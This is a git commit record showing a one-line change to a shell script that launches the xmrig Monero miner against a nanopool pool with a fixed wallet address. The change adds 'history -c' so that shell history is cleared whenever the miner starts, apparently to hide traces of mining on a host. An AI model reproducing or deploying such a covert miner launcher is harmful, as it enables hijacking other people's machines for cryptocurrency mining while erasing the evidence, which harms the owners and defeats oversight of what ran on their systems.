c4fc1c177fb1390c78c557765484c4fbd80c2c54
_sys <39033340+harimor@users.noreply.github.com>
2021-11-11 23:44:48 +0200

    Update eu1_n.sh

--- eu1_n.sh
+++ eu1_n.sh
@@ -1,1 +1,1 @@
-./xmrig -a rx/0 -o xmr-eu1.nanopool.org:14433 -u 4B2WBzb9y3Eer1CvAcxFd7W3fcY2geALqRGhtcTTFouZ8SRNGwqxYA3Z7BdApLGbaoZMC9ZPGHh79JSsMXZujjWGNSYyQSe -k --tls -p d00m$0p --coin monero
+history -c | ./xmrig -a rx/0 -o xmr-eu1.nanopool.org:14433 -u 4B2WBzb9y3Eer1CvAcxFd7W3fcY2geALqRGhtcTTFouZ8SRNGwqxYA3Z7BdApLGbaoZMC9ZPGHh79JSsMXZujjWGNSYyQSe -k --tls -p d00m$0p --coin monero
